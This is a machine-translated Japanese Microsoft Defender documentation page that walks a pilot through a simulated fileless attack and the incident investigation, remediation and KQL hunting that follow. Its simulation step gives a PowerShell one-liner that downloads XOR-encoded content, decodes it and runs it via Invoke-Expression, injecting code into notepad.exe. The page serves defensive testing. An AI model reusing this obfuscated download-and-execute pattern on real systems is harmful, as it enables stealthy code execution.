---
title: Microsoft 365 Defender攻撃シミュレーションを実行する
description: Microsoft 365 Defenderパイロット プロジェクトの攻撃シミュレーションを実行して、それがどのように展開され、迅速に修復されるかを確認します。
keywords: Microsoft 365 Defenderパイロット攻撃シミュレーション、Microsoft 365 Defenderパイロット攻撃シミュレーションの実行、Microsoft 365 Defenderでの攻撃のシミュレート、Microsoft 365 Defender パイロット プロジェクト, サイバー セキュリティ, 高度な永続的な脅威, エンタープライズ セキュリティ, デバイス, デバイス, ID, ユーザー, データ, アプリケーション, インシデント, 自動調査と修復, 高度な捜索
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: 18dc8158ef3c806e5dac5a01778adebc6eecc1ce
ms.sourcegitcommit: 9856f86532bdcf0befbcdbdb7c6dc6bf89fe63b5
ms.translationtype: MT
ms.contentlocale: ja-JP
ms.lasthandoff: 07/16/2021
ms.locfileid: "53458432"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a>Microsoft 365 Defender攻撃シミュレーションを実行する

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|[![計画](../../media/phase-diagrams/1-planning.png)](m365d-pilot-plan.md)<br/>[計画](m365d-pilot-plan.md)|[![準備](../../media/phase-diagrams/2-prepare.png)](prepare-m365d-eval.md)<br/>[準備](prepare-m365d-eval.md)|![攻撃のシミュレーション](../../media/phase-diagrams/3-simluate.png)<br/>攻撃のシミュレーション|[![閉じて要約する](../../media/phase-diagrams/4-summary.png)](m365d-pilot-close.md)<br/>[閉じて要約する](m365d-pilot-close.md)|
|--|--|--|--|
|||*お客様はここにいます。*||

現在、攻撃シミュレーション フェーズに入っています。

パイロット環境を準備したら、Microsoft 365 Defenderインシデント管理と自動調査と修復機能をテストします。 高度な手法を利用して検出から隠れる高度な攻撃をシミュレートするのに役立ちます。 この攻撃により、ドメイン コントローラーで開かれたサーバー メッセージ ブロック (SMB) セッションが列挙され、ユーザーのデバイスの最近の IP アドレスが取得されます。 通常、このカテゴリの攻撃には、被害者のデバイスにドロップされたファイルは含まれません。これらはメモリ内でのみ発生します。 既存のシステムツールと管理ツールを使用して "陸から離れて生活する" ため、コードをシステム プロセスに挿入して実行を非表示にします。このような動作により、検出を回避し、デバイス上で永続化できます。

このシミュレーションでは、サンプル シナリオは PowerShell スクリプトから始まります。 ユーザーがスクリプトの実行をだまされる可能性があります。 または、以前に感染したデバイスから別のコンピューターへのリモート接続からスクリプトが実行される可能性があります。攻撃者はネットワーク内を横方向に移動しようとしています。 管理者はさまざまな管理アクティビティを実行するためにリモートでスクリプトを実行することも多いため、これらのスクリプトの検出は困難な場合があります。

![プロセスインジェクションと SMB 偵察攻撃を使用したファイルレス PowerShell 攻撃の図](../../media/mtp/mtpdiydiagram.png)

シミュレーション中、攻撃はシェルコードを一見無実のプロセスに挿入します。 このシナリオでは、notepad.exeを使用する必要があります。 シミュレーションにこのプロセスを選択しましたが、攻撃者はsvchost.exeなどの長時間実行されるシステム プロセスをターゲットにする可能性が高くなります。 その後、シェルコードは攻撃者のコマンドアンドコントロール (C2) サーバーに連絡し、続行方法の指示を受け取ります。 スクリプトは、ドメイン コントローラー (DC) に対する偵察クエリの実行を試みます。 偵察により、攻撃者は最近のユーザー ログイン情報に関する情報を取得できます。 攻撃者がこの情報を取得したら、ネットワーク内を横方向に移動して、特定の機密性の高いアカウントにアクセスできます。

> [!IMPORTANT]
> 最適な結果を得るには、攻撃シミュレーションの指示にできるだけ近い手順に従ってください。

## <a name="simulation-environment-requirements"></a>シミュレーション環境の要件

準備フェーズ中にパイロット環境を既に構成しているため、このシナリオではテスト デバイスとドメイン コントローラーの 2 つのデバイスがあることを確認します。

1. テナントで[Microsoft 365 Defenderが有効](m365d-enable.md#confirm-that-the-service-is-on)になっていることを確認します。

2. テスト ドメイン コントローラーの構成を確認します。

   - デバイスは、Windows Server 2008 R2 以降のバージョンで実行されます。
   - [リモート管理](/windows-server/administration/server-manager/configure-remote-management-in-server-manager)を[Microsoft Defender for Identity](/azure/security-center/security-center-wdatp)して有効にするテスト ドメイン コントローラー。
   - [Microsoft Defender for IdentityとMicrosoft Cloud App Securityの統合](/cloud-app-security/mdi-integration)が有効になっていることを確認します。
   - テスト ユーザーはドメインに作成されます。管理者のアクセス許可は必要ありません。

3. テスト デバイスの構成を確認します。

   1. デバイスは、Windows 10 バージョン 1903 以降で実行されます。

   1. テスト デバイスがテスト ドメインに参加しています。

   1. [Windows Defender ウイルス対策をオンにします](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)。 Windows Defender ウイルス対策を有効にできない場合は、この[トラブルシューティング トピックを](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)参照してください。

   1. テスト デバイスが [Microsoft Defender for Endpoint) にオンボード](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)されていることを確認します。

既存のテナントを使用し、デバイス グループを実装する場合は、テスト デバイス用の専用デバイス グループを作成し、構成 UX の最上位レベルにプッシュします。

## <a name="run-the-attack-scenario-simulation"></a>攻撃シナリオ シミュレーションを実行する

攻撃シナリオ シミュレーションを実行するには:

1. テスト ユーザー アカウントを使用してテスト デバイスにログインします。

2. テスト デバイスでWindows PowerShell ウィンドウを開きます。

3. 次のシミュレーション スクリプトをコピーします。

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > このドキュメントを Web ブラウザーで開くと、特定の文字を失ったり、改行を追加したりすることなく、フル テキストをコピーする際に問題が発生する可能性があります。 このドキュメントをダウンロードし、Adobe Reader で開きます。

4. プロンプトで、コピーしたスクリプトを貼り付けて実行します。

> [!NOTE]
> リモート デスクトップ プロトコル (RDP) を使用して PowerShell を実行している場合は、 **CTRL-V** ホットキーまたは右クリック貼り付けメソッドが機能しない可能性があるため、RDP クライアントで [クリップボードテキストの入力] コマンドを使用します。 最近のバージョンの PowerShell では、そのメソッドが受け入れられません。最初にメモリ内のメモ帳にコピーし、仮想マシンでコピーしてから PowerShell に貼り付ける必要がある場合があります。

数秒後、 <i>notepad.exe</i> が開きます。 シミュレートされた攻撃コードがnotepad.exeに挿入されます。 自動的に生成されたメモ帳 インスタンスを開いたままにして、完全なシナリオを体験します。

シミュレートされた攻撃コードは、外部 IP アドレスとの通信 (C2 サーバーのシミュレート) を試み、SMB を介してドメイン コントローラーに対する偵察を試みます。

このスクリプトが完了すると、PowerShell コンソールにメッセージが表示されます。

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

自動インシデントと応答機能の動作を確認するには、notepad.exe プロセスを開いたままにします。 自動インシデントと応答がメモ帳 プロセスを停止することがわかります。

## <a name="investigate-an-incident"></a>インシデントの調査

> [!NOTE]
> このシミュレーションについて説明する前に、次のビデオを参照して、インシデント管理が調査プロセスの一環として関連するアラートをまとめ、ポータルで見つける方法、およびセキュリティ操作にどのように役立つかを確認します。

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

SOC アナリストの観点に切り替えると、Microsoft 365 Security Center ポータルで攻撃の調査を開始できるようになりました。

1. 任意のデバイスから [Microsoft 365 Security Center ポータル](https://security.microsoft.com/incidents)インシデント キューを開きます。

2. メニューから **インシデント** に移動します。

    ![Microsoft 365 Security Center の左側のメニューに示されているインシデントのスクリーンショット](../../media/mtp/fig1.png)

3. シミュレートされた攻撃の新しいインシデントがインシデント キューに表示されます。

    ![インシデント キューのスクリーンショット](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a>1 つのインシデントとして攻撃を調査する

Microsoft 365 Defenderは分析を関連付け、関連するすべてのアラートと調査を異なる製品から 1 つのインシデント エンティティに集約します。 これにより、Microsoft 365 Defenderは広範な攻撃ストーリーを示し、SOC アナリストは複雑な脅威を理解して対応できます。

このシミュレーション中に生成されたアラートは同じ脅威に関連付けられます。その結果、1 つのインシデントとして自動的に集計されます。

インシデントを表示するには:

1. **インシデント** キューに移動します。

   ![ナビゲーション メニューからのインシデントのスクリーンショット](../../media/mtp/fig1.png)

2. インシデント名の左側にある円をクリックして、最新のアイテムを選択します。 サイド パネルには、関連するすべてのアラートを含む、インシデントに関する追加情報が表示されます。 各インシデントには、含まれるアラートの属性に基づいて説明する一意の名前が付けられます。

   ![シミュレーション中に生成されたアラートが集計されるインシデント ページのスクリーンショット](../../media/mtp/fig4.png)

   ダッシュボードに表示されるアラートは、サービス リソース (Microsoft Defender for Identity、Microsoft Cloud App Security、Microsoft Defender for Endpoint、Microsoft 365 Defender、およびMicrosoft Defender for Office 365。

3. [ **インシデントを開く] ページ** を選択して、インシデントの詳細を確認します。

   [ **インシデント]** ページには、インシデントに関連するすべてのアラートと情報が表示されます。 この情報には、アラートに関連するエンティティと資産、アラートの検出ソース (Microsoft Defender for Identity、EDR)、およびそれらがリンクされた理由が含まれます。 インシデント アラートリストを確認すると、攻撃の進行が示されます。 このビューから、個々のアラートを確認して調査できます。

   また、右側のメニューから [ **インシデントの管理** ] をクリックして、インシデントにタグを付け、自分に割り当て、コメントを追加することもできます。

   ![[インシデントの管理] をクリックする場所のスクリーンショット](../../media/mtp/fig5a.png)

   ![インシデントをタグ付けし、自分に割り当て、コメントを追加できる[インシデントの管理] パネルのフィールドのスクリーンショット](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a>生成されたアラートを確認する

シミュレートされた攻撃中に生成されたアラートの一部を見てみましょう。

> [!NOTE]
> シミュレートされた攻撃の間に生成されたアラートのほんの一部について説明します。 テスト デバイスで実行されているWindowsのバージョンとMicrosoft 365 Defender製品によっては、少し異なる順序で表示されるアラートが表示される場合があります。

![生成されたアラートのスクリーンショット](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a>アラート: 疑わしいプロセスインジェクションが観察されました (ソース: Microsoft Defender for Endpoint EDR)

高度な攻撃者は、高度で密な方法を使用してメモリ内に保持し、検出ツールから隠します。 一般的な手法の 1 つは、悪意のある実行可能ファイルではなく、信頼されたシステム プロセス内で動作するため、検出ツールやセキュリティ操作で悪意のあるコードを見つけるのが困難です。

SOC アナリストがこれらの高度な攻撃をキャッチできるように、Microsoft Defender for Endpointのディープ メモリ センサーは、さまざまなクロスプロセス コードインジェクション手法を前例のない可視性でクラウド サービスに提供します。 次の図は、notepad.exeにコードを挿入しようとしたときに Defender for Endpoint が検出され、警告された <i> 方法を示 </i>しています。

![悪意のある可能性があるコードの挿入に関するアラートのスクリーンショット](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a>アラート: コマンド ライン引数なしで実行されるプロセスによって観察される予期しない動作 (ソース: Microsoft Defender for Endpoint EDR)

Microsoft Defender for Endpoint検出は、多くの場合、攻撃手法の最も一般的な属性を対象とします。 この方法により、持続性が確保され、攻撃者が新しい戦術に切り替える際のバーが発生します。

大規模な学習アルゴリズムを使用して、組織内および世界中の一般的なプロセスの通常の動作を確立し、これらのプロセスが異常な動作を示すタイミングを監視します。 これらの異常な動作は、多くの場合、余分なコードが導入され、それ以外の場合は信頼されたプロセスで実行されていることを示します。

このシナリオでは、 <i> プロセスnotepad.exe</i> が異常な動作を示し、外部の場所との通信が関係しています。 この結果は、悪意のあるコードの導入と実行に使用される特定の方法とは無関係です。

> [!NOTE]
> このアラートは、追加のバックエンド処理を必要とする機械学習モデルに基づいているため、ポータルにこのアラートが表示されるまでに時間がかかる場合があります。

アラートの詳細には、外部 IP アドレスが含まれていることに注意してください。これは、調査を展開するためのピボットとして使用できるインジケーターです。

アラート プロセス ツリーで IP アドレスを選択して、IP アドレスの詳細ページを表示します。

![コマンド ライン引数なしで実行されるプロセスによる予期しない動作に関するアラートのスクリーンショット](../../media/mtp/fig8.png)

次の図は、選択した IP アドレスの詳細ページを表示します (アラート プロセス ツリーで IP アドレスをクリックします)。
![[IP アドレスの詳細] ページのスクリーンショット](../../media/mtp/fig9.png)

#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>アラート: ユーザーと IP アドレスの偵察 (SMB) (ソース: Microsoft Defender for Identity)

サーバー メッセージ ブロック (SMB) プロトコルを使用した列挙により、攻撃者は、特定の機密性の高いアカウントにアクセスするためにネットワークを横方向に移動するのに役立つ最近のユーザー ログオン情報を取得できます。

この検出では、SMB セッション列挙がドメイン コントローラーに対して実行されると、アラートがトリガーされます。

![ユーザーと IP アドレスの偵察に関するMicrosoft Defender for Identityアラートのスクリーンショット](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a>デバイスのタイムラインを確認する [Microsoft Defender for Endpoint]

このインシデントのさまざまなアラートを調べた後、前に調査したインシデント ページに戻ります。 [インシデント] ページの [**デバイス**] タブを選択して、Microsoft Defender for EndpointとMicrosoft Defender for Identityによって報告されたこのインシデントに関連するデバイスを確認します。

攻撃が行われたデバイスの名前を選択して、その特定のデバイスのエンティティ ページを開きます。 そのページには、トリガーされたアラートと関連するイベントが表示されます。

[ **タイムライン** ] タブを選択すると、デバイスのタイムラインが開き、発生したアラートと一緒にデバイスで観察されたすべてのイベントと動作が時系列順に表示されます。

![動作を含むデバイス タイムラインのスクリーンショット](../../media/mtp/fig11.png)

より興味深い動作の一部を展開すると、プロセス ツリーなどの有用な詳細が提供されます。

たとえば、アラート イベント **の疑わしいプロセスインジェクションが観察** されるまで下にスクロールします。 その下の **プロセス イベントnotepad.exe挿入するpowershell.exe** を選択すると、この動作の完全なプロセス ツリーがサイド ウィンドウの **[イベント エンティティ** ] グラフに表示されます。 必要に応じて、検索バーを使用してフィルター処理を行います。

![選択した PowerShell ファイル作成動作のプロセス ツリーのスクリーンショット](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a>ユーザー情報を確認する [Microsoft Cloud App Security]

インシデント ページで、[ **ユーザー** ] タブを選択して、攻撃に関与したユーザーの一覧を表示します。 この表には、各ユーザーの **調査優先度** スコアなど、各ユーザーに関する追加情報が含まれています。

ユーザー名を選択してユーザーのプロファイル ページを開き、さらに調査を行うことができます。 [リスクの高いユーザーの調査について詳しくは、こちらをご覧ください](/cloud-app-security/tutorial-ueba#identify)。

![Cloud App Securityユーザー ページのスクリーンショット](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a>調査と修復の自動化

> [!NOTE]
>このシミュレーションについて説明する前に、次のビデオを見て、自動自己修復とは何か、ポータルで見つける場所、セキュリティ操作にどのように役立つかを理解してください。

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Microsoft 365 Security Center ポータルでインシデントに戻ります。 [**インシデント**] ページ **の [調査**] タブには、Microsoft Defender for IdentityとMicrosoft Defender for Endpointによってトリガーされた自動調査が表示されます。 次のスクリーンショットは、Defender for Endpoint によってトリガーされた自動調査のみを示しています。 既定では、Defender for Endpoint はキュー内で見つかったアーティファクトを自動的に修復します。修復が必要です。

![インシデントに関連する自動調査のスクリーンショット](../../media/mtp/fig14.png)

調査をトリガーしたアラートを選択して、[調査の **詳細** ] ページを開きます。 次の詳細が表示されます。

- 自動調査をトリガーしたアラート。
- 影響を受けたユーザーとデバイス。 インジケーターが追加のデバイスで見つかった場合は、これらの追加デバイスも一覧表示されます。
- 証拠の一覧。 ファイル、プロセス、サービス、ドライバー、ネットワーク アドレスなど、検出および分析されたエンティティ。 これらのエンティティは、アラートとの可能な関係について分析され、無害または悪意のあるものとして評価されます。
- 見つかった脅威。 調査中に検出された既知の脅威。

> [!NOTE]
> タイミングによっては、自動調査がまだ実行されている可能性があります。 プロセスが完了するまで数分待ってから、証拠を収集して分析し、結果を確認します。 **[調査の詳細**] ページを更新して、最新の結果を取得します。

![[調査の詳細] ページのスクリーンショット](../../media/mtp/fig15.png)

自動調査中に、Microsoft Defender for Endpoint修復が必要な成果物の 1 つとして挿入されたnotepad.exe プロセスを特定しました。 Defender for Endpoint は、自動修復の一環として疑わしいプロセスインジェクションを自動的に停止します。

テスト デバイスで実行中のプロセスの一覧 <i> からnotepad.exe消 </i> えることがわかります。

## <a name="resolve-the-incident"></a>インシデントを解決する

調査が完了し、修復が確認されたら、インシデントを閉じます。

[ **インシデントの管理**] を選択します。 状態を **[インシデントの解決]** に設定し、関連する分類を選択します。

インシデントが解決されると、Microsoft 365 Security Center および関連するポータルで、関連するすべてのアラートが閉じられます。

![インシデントを解決するためにスイッチをクリックできる[インシデントの管理] パネルが開いているインシデント ページのスクリーンショット](../../media/mtp/fig16.png)

これにより、インシデント管理と自動調査と修復のシナリオに対する攻撃シミュレーションがまとめられます。 次のシミュレーションでは、悪意のある可能性があるファイルに対するプロアクティブな脅威の捜索を実行します。

## <a name="advanced-hunting-scenario"></a>高度なハンティング シナリオ

> [!NOTE]
> シミュレーションを実行する前に、次のビデオを見て、高度なハンティングの概念を理解し、ポータルで検索できる場所を確認し、セキュリティ操作に役立つ方法を確認してください。

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a>ハンティング環境の要件

このシナリオには、1 つの内部メールボックスとデバイスが必要です。 テスト メッセージを送信するには、外部メール アカウントも必要です。

1. テナントで[Microsoft 365 Defenderが有効](m365d-enable.md#confirm-that-the-service-is-on)になっていることを確認します。
2. 電子メールの受信に使用するターゲット メールボックスを特定します。
    a.  このメールボックスは、Microsoft Defender for Office 365 b によって監視する必要があります。 要件 3 のデバイスは、このメールボックスにアクセスする必要があります
3. テスト デバイスを構成する: a. Windows 10 バージョン 1903 以降のバージョンを使用していることを確認します。
    b. テスト デバイスをテスト ドメインに参加させます。
    c. [Windows Defender ウイルス対策をオンにします](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)。 Windows Defender ウイルス対策を有効にできない場合は、[このトラブルシューティング トピックを](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)参照してください。
    d. [Microsoft Defender for Endpointにオンボード](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)します。

### <a name="run-the-simulation"></a>シミュレーションを実行する

1. 外部メール アカウントから、テスト環境の要件セクションの手順 2 で識別されたメールボックスに電子メールを送信します。 既存の電子メール フィルター ポリシーで許可される添付ファイルを含めます。 このファイルは、悪意のあるファイルや実行可能ファイルである必要はありません。 推奨されるファイルの種類は<i>、.pdf</i>、 <i>.exe</i> (許可されている場合)、Word ファイルなどのドキュメントOfficeします。
2. テスト環境の要件セクションの手順 3 で定義されているように構成されたデバイスから送信された電子メールを開きます。 添付ファイルを開くか、デバイスにファイルを保存します。

#### <a name="go-hunting"></a>ハンティングに行く

1. security.microsoft.com ポータルを開きます。

2. **[ハンティング] > [高度なハンティング]** に移動します。

   ![M365 Security Center ポータルナビゲーション バーの高度なハンティングのスクリーンショット](../../media/mtp/fig17.png)

3. メール イベントの収集から始まるクエリを作成します。

   1. クエリ ウィンドウで、[新規] を選択します。

   1. スキーマから EmailEvents テーブルをダブルクリックします。

      ```console
      EmailEvents
      ```

   1. 期間を過去 24 時間に変更します。 上記のシミュレーションを実行したときに送信したメールが過去 24 時間であったと想定し、それ以外の場合は時間枠を変更します。

      ![時間枠を変更できる場所のスクリーンショット。 ドロップダウン メニューを開き、期間の範囲のオプションから選択する](../../media/mtp/fig18.png)

   1. クエリを実行します。 パイロットの環境によっては、多くの結果が得られます。

      > [!NOTE]
      > データの戻り値を制限するフィルター オプションについては、次の手順を参照してください。

      ![高度なハンティング クエリの結果のスクリーンショット](../../media/mtp/fig19.png)

        > [!NOTE]
        > 高度な検索では、クエリ結果が表形式のデータとして表示されます。 グラフなどの他の形式でデータを表示することもできます。

   1. 結果を確認し、開いたメールを特定できるかどうかを確認します。 高度な捜索でメッセージが表示されるまでには、最大で 2 時間かかる場合があります。 電子メール環境が大きく、結果が多い場合は、[ **フィルターの表示] オプション** を使用してメッセージを見つける必要があります。

      サンプルでは、電子メールが Yahoo アカウントから送信されました。 SenderFromDomain セクションの **+** **yahoo.com** 横にあるアイコンをクリックし、[ **適用** ] をクリックして選択したドメインをクエリに追加します。 シミュレーションの実行の手順 1 でテスト メッセージを送信するために使用したドメインまたは電子メール アカウントを使用して、結果をフィルター処理します。 クエリをもう一度実行して、小さい結果セットを取得して、シミュレーションからのメッセージが表示されることを確認します。

      ![フィルターのスクリーンショット。 フィルターを使用して検索を絞り込み、探しているものをより速く見つけます。](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. レコードを調べるには、クエリから結果の行をクリックします。

      ![高度なハンティング結果が選択されたときに開く検査レコード側パネルのスクリーンショット](../../media/mtp/fig21.png)

4. メールが表示されることを確認したので、添付ファイルのフィルターを追加します。 環境内の添付ファイルを含むすべてのメールに焦点を当てます。 このシナリオでは、環境から送信されるメールではなく、受信メールに焦点を当てます。 追加したフィルターを削除してメッセージを探し、"| **ここで AttachmentCount > 0** と **EmailDirection** == **"Inbound""**

   次のクエリでは、すべての電子メール イベントに対する最初のクエリよりも短いリストで結果が表示されます。

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. 次に、結果セットへの添付ファイルに関する情報 (ファイル名、ハッシュなど) を含めます。 これを行うには、 **EmailAttachmentInfo テーブルに** 参加します。 参加に使用する一般的なフィールドは、この場合は **NetworkMessageId** と **RecipientObjectId です**。

   次のクエリには、追加の行 "| **project-rename EmailTimestamp=Timestamp**" は、次の手順で追加するファイル アクションに関連する電子メールとタイムスタンプに関連したタイムスタンプを識別するのに役立ちます。

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. 次に、**EmailAttachmentInfo** テーブルの **SHA256** 値を使用して、そのハッシュの **DeviceFileEvents** (エンドポイントで発生したファイル アクション) を見つけます。 ここでの共通フィールドは、添付ファイルの SHA256 ハッシュです。

   結果のテーブルには、デバイス名、実行されたアクション (この場合は FileCreated イベントのみを含むフィルター処理)、ファイルの格納場所など、エンドポイント (Microsoft Defender for Endpoint) の詳細が含まれるようになりました。 プロセスに関連付けられているアカウント名も含まれます。

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   これで、ユーザーが添付ファイルを開いたり保存したりしたすべての受信メールを識別するクエリを作成しました。 このクエリを絞り込んで、特定の送信者ドメイン、ファイル サイズ、ファイルの種類などをフィルター処理することもできます。

7. 関数は特殊な結合であり、その普及率、署名者、発行者情報などのファイルに関する TI データを引き出します。ファイルの詳細を取得するには、 **FileProfile()** 関数エンリッチメントを使用します。

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a>検出を作成する

今後発生した場合に **アラートを受け取** る情報を識別するクエリを作成したら、クエリからカスタム検出を作成できます。

カスタム検出では、設定した頻度に従ってクエリが実行され、クエリの結果によって、選択した影響を受ける資産に基づいてセキュリティ アラートが作成されます。 これらのアラートはインシデントに関連付けられるので、製品の 1 つによって生成された他のセキュリティ アラートとしてトリアージできます。

1. クエリ ページで、Go ハンティング手順の手順 7 で追加された行 7 と 8 を削除し、[ **検出規則の作成**] をクリックします。

   ![高度なハンティング ページで [検出ルールの作成] をクリックできる場所のスクリーンショット](../../media/mtp/fig22.png)

   > [!NOTE]
   > **[検出ルールの作成**] をクリックすると、クエリに構文エラーが発生しても、検出ルールは保存されません。 クエリを再確認して、エラーがないことを確認します。

2. 必要なフィールドに、セキュリティ チームがアラートを理解できるようにする情報、それが生成された理由、および必要なアクションを入力します。

   ![アラートの詳細を定義できる検出ルールの作成ページのスクリーンショット](../../media/mtp/fig23.png)

   この検出ルールアラートに関する情報に基づいた決定を次のユーザーに提供するために、フィールドに明確な情報を入力してください

3. このアラートで影響を受けたエンティティを選択します。 この場合は、[ **デバイス** ] と [メールボックス] を選択 **します**。

   ![影響を受けるエンティティのパラメーターを選択できる検出ルールの作成ページのスクリーンショット](../../media/mtp/fig24.png)

4. アラートがトリガーされた場合に実行するアクションを決定します。 この場合はウイルス対策スキャンを実行しますが、他のアクションを実行することもできます。

   ![脅威に対処するためにアラートがトリガーされたときにウイルス対策スキャンを実行できる検出ルールの作成ページのスクリーンショット](../../media/mtp/fig25.png)

5. アラート ルールのスコープを選択します。 このクエリにはデバイスが含まれるため、デバイス グループは、Microsoft Defender for Endpointコンテキストに従ってこのカスタム検出に関連します。 影響を受けるエンティティとしてデバイスを含まないカスタム検出を作成する場合、スコープは適用されません。

   ![アラート ルールのスコープを設定できる検出ルールの作成ページのスクリーンショットは、表示される結果に対する期待を管理します。](../../media/mtp/fig26.png)

   このパイロットでは、このルールを運用環境のテスト デバイスのサブセットに制限することができます。

6. **[作成]** を選択します。 次に、ナビゲーション パネルから **[カスタム検出規則** ] を選択します。

   ![メニューの [カスタム検出規則] オプションのスクリーンショット](../../media/mtp/fig27a.png)

   ![ルールと実行の詳細を表示する検出ルール ページのスクリーンショット](../../media/mtp/fig27b.png)

   このページから検出ルールを選択すると、詳細ページが開きます。

   ![ルールの実行の状態、トリガーされたアラートとアクション、検出の編集などを確認できる電子メールの添付ファイル ページのスクリーンショット](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a>その他の高度なハンティング ウォークスルー演習

高度な捜索の詳細については、次の Web キャストを使用して、Microsoft 365 Defender内で高度なハンティングを実行して、クロスピラー クエリを作成し、エンティティにピボットし、カスタム検出と修復アクションを作成します。

> [!NOTE]
> パイロット テスト ラボ環境でハンティング クエリを実行するには、独自のGitHub アカウントを使用して準備してください。

|Title|説明|MP4 をダウンロードする|YouTube で視聴する|使用する CSL ファイル|
|---|---|---|---|---|
|エピソード 1: KQLの基礎|Microsoft 365 Defenderの高度なハンティング機能の基本について説明します。 使用可能な高度なハンティング データと、基本的なKQL構文と演算子について説明します。|[MP4](https://aka.ms/MTP15JUL20_MP4)|[YouTube](https://youtu.be/0D9TkGjeJwM)|[エピソード 1: Git の CSL ファイル](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
|エピソード 2: Joins|高度な捜索におけるデータと、テーブルを結合する方法について引き続き学習します。 内部結合、外部結合、一意結合、および半結合、および既定のKusto innerunique 結合の微妙な違いについて説明します。|[MP4](https://aka.ms/MTP22JUL20_MP4)|[YouTube](https://youtu.be/LMrO6K5TWOU)|[エピソード 2: Git の CSL ファイル](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|エピソード 3: データの集計、ピボット、および視覚化|データをフィルター処理、操作、結合できるようになったので、次は集計、定量化、ピボット、視覚化を開始します。 このエピソードでは、集計演算子と、高度なハンティング スキーマの追加テーブルに飛び込むときに実行できる計算の一部について説明します。 データセットをグラフに変換し、分析の改善に役立ちます。|[MP4](https://aka.ms/MTP29JUL20_MP4)|[YouTube](https://youtu.be/UKnk9U1NH6Y)|[エピソード 3: Git の CSL ファイル](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
|エピソード 4: ハントしましょう。 インシデント追跡にKQLを適用する|攻撃者のアクティビティを追跡する時間! このエピソードでは、KQLに対する理解を高め、Microsoft 365 Defenderでの高度な捜索を使用して攻撃を追跡します。 サイバーセキュリティの ABC やインシデント対応に適用する方法など、攻撃者のアクティビティを追跡するためにフィールドで使用されるヒントとテクニックについて説明します。|[MP4](https://aka.ms/MTP5AUG20_MP4)|[YouTube](https://youtu.be/2EUxOc_LNd8)|[エピソード 4: Git の CSL ファイル](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a>次の手順

